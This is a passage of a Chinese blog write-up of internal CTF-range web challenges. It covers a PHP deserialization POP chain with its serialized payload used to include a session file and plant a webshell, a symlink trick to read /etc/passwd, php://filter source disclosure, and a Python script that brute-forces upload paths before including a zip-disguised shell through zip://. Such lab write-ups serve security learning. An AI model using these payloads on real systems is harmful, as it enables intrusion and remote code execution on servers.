class="keyword">empty</span> value in D:\phpstudy_pro\WWW\poc.php on line <span class="number">10</span></span><br><span class="line">Warning: <span class="keyword">include_once</span>(<span class="number">123</span>): failed to open stream: No such file <span class="keyword">or</span> directory in D:\phpstudy_pro\WWW\poc.php on line <span class="number">14</span></span><br><span class="line">Warning: <span class="keyword">include_once</span>(): Failed opening <span class="string">&#x27;123&#x27;</span> <span class="keyword">for</span> <span class="title function_ invoke__">inclusion</span> (include_path=<span class="string">&#x27;.;C:\php\pear&#x27;</span>) in D:\phpstudy_pro\WWW\poc.php on line <span class="number">14</span></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到有警告，但是<code>include_once</code>是被调用了的。所以我们只需要对<code>filename</code>赋值，让它指向对应session文件所在位置即可。同时我们也要利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = $_POST[&#x27;user&#x27;];</span><br><span class="line">$_SESSION[&#x27;user&#x27;] = $user;</span><br></pre></td></tr></table></figure>
+
+<p>来产生<code>session</code>文件，里面的值又是我们可控的，会是字符串的一个序列化结果。</p>
+<p>利用链POC:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#/var/lib/php/sessions/sess_0anrh6nhmd06rgsqms148s55i0  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eem</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hh</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ff</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hh = <span class="keyword">new</span> <span class="title function_ invoke__">nb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename =<span class="string">&quot;/var/lib/php/sessions/sess_0anrh6nhmd06rgsqms148s55i0&quot;</span>;  <span class="comment">//这个id抓包可以找到。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eem</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得到O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>eem%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>hh%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>nb%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A53%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fvar%<span class="number">2</span>Flib%<span class="number">2</span>Fphp%<span class="number">2</span>Fsessions%<span class="number">2</span>Fsess_0anrh6nhmd06rgsqms148s55i0%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>ff%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>gg%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样的， php , file 要双写，最终的利用链<code>poc</code>:<code>O%3A3%3A%22eem%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00hh%22%3BO%3A2%3A%22nb%22%3A3%3A%7Bs%3A8%3A%22ffileilename%22%3Bs%3A53%3A%22%2Fvar%2Flib%2Fpphphp%2Fsessions%2Fsess_0anrh6nhmd06rgsqms148s55i0%22%3Bs%3A5%3A%22class%22%3BN%3Bs%3A4%3A%22test%22%3BN%3B%7Ds%3A2%3A%22ff%22%3BN%3Bs%3A2%3A%22gg%22%3BN%3B%7D</code></p>
+<p>在此之前，需要先post 传user 写个shell:</p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d6ca072e50.png" alt="emm代码审计1.png"></p>
+<p>然后用get data传<code>O%3A3%3A%22eem%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00hh%22%3BO%3A2%3A%22nb%22%3A3%3A%7Bs%3A8%3A%22ffileilename%22%3Bs%3A53%3A%22%2Fvar%2Flib%2Fpphphp%2Fsessions%2Fsess_0anrh6nhmd06rgsqms148s55i0%22%3Bs%3A5%3A%22class%22%3BN%3Bs%3A4%3A%22test%22%3BN%3B%7Ds%3A2%3A%22ff%22%3BN%3Bs%3A2%3A%22gg%22%3BN%3B%7D</code></p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d6d05e7850.png" alt="emm代码审计2.png"></p>
+<p>可以发现成功包含了session文件。接下来直接上哥斯拉：</p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d6dd23074c.png" alt="emm代码审计3.png"></p>
+<h1 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h1><p>环境存在问题，看了下wp，把知识点记录一下:</p>
+<p><code>flask cookie伪造管理员身份</code>、<code>ln -s /etc/passwd  123.jpg</code>  软连接   <code>tar cvfp shellcode.tar 123.jpg</code>  <code>curl xxxxx/download/123.jpg</code></p>
+<h1 id="image-up"><a href="#image-up" class="headerlink" title="image_up"></a>image_up</h1><p>环境太卡了，这个题目涉及爆破，估计是环境原因，没爆破出来。</p>
+<p>一开始在login界面可以发现：</p>
+<p><img src="https://free.wmhua.cn/2025/12/14/693e2f37745a1.png" alt="image_up1.png"></p>
+<p>这种可能存在文件包含，可以尝试<code>php://filter</code> 来读源码，<code>http://10.45.1.22/index.php?page=php://filter/convert.base64-encode/resource=login</code>，base64解码一下并没有啥有用信息，于是随便账号密码输入一下，发现可以直接登录，然后接着读upload 源码：<code>http://10.45.1.22/index.php?page=php://filter/convert.base64-encode/resource=uplaod</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;image&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span>((@<span class="variable">$_upfileS</span>[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">102400</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$exts</span>))&#123;</span><br><span class="line">              <span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$temp</span>[<span class="number">0</span>].<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">              <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$path</span>);</span><br><span class="line">              <span class="variable">$error</span> = <span class="string">&quot;上传成功!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$error</span> = <span class="string">&quot;文件过大，上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>采用的白名单校验，但是这里的<code> $path = &quot;uploads/&quot;.md5($temp[0].time()).&quot;.&quot;.$extension;</code> 都是可控的。注意这里 time()返回的是个整数，这个可以本地<code>php</code>环境测试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//输出1765682330</span></span><br></pre></td></tr></table></figure>
+
+<p>所以都可控，这里只让传<code>jpg png gif jpeg</code> ，于是 写一个一句话放到<code>shellcode.php</code>  然后压缩一下<code>shellcode.zip</code>，然后改下后缀，改成<code>shellcode.jpg</code> ，</p>
+<p>我们把这个上传，然后用<code>zip</code>协议去读，刚好题目的环境是可以拼接php的。</p>
+<p>所以先把文件传上去，并爆破出文件路径：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">&quot;http://10.45.1.22/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;image&quot;</span>: (<span class="string">&quot;shellcode.jpg&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;shellcode.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line">t = <span class="built_in">int</span>(time.time())</span><br><span class="line">requests.post(url=url + <span class="string">&quot;index.php?page=upload&quot;</span>, files=files)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t - <span class="number">100</span>, t + <span class="number">100</span>):</span><br><span class="line">    path = <span class="string">&quot;uploads/&quot;</span> + md5(<span class="string">&quot;shellcode&quot;</span> + <span class="built_in">str</span>(i)) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    status = requests.get(url=url + path).status_code</span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(path)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>但是很可惜没爆破出来，估计是环境太卡的原因。</p>
+<p>假设爆破出来的格式为：<code>uploads/0d613371c53db3f0698d66fed54139f9.jpg</code>，那么就是<code>http://10.45.1.22/uploads/0d613371c53db3f0698d66fed54139f9.jpg</code></p>
+<p>我们直接伪协议来读<code>http://10.45.1.22/index.php?page=zip://./uploads/0d613371c53db3f0698d66fed54139f9.jpg%23shellcode</code>，这样可以直接包含shell了。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA/" rel="tag"># 内部靶场</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/05/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%831110-1116/" rel="prev" title="内部靶场训练1110-1116">
+                  <i class="fa fa-angle-left"></i> 内部靶场训练1110-1116
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
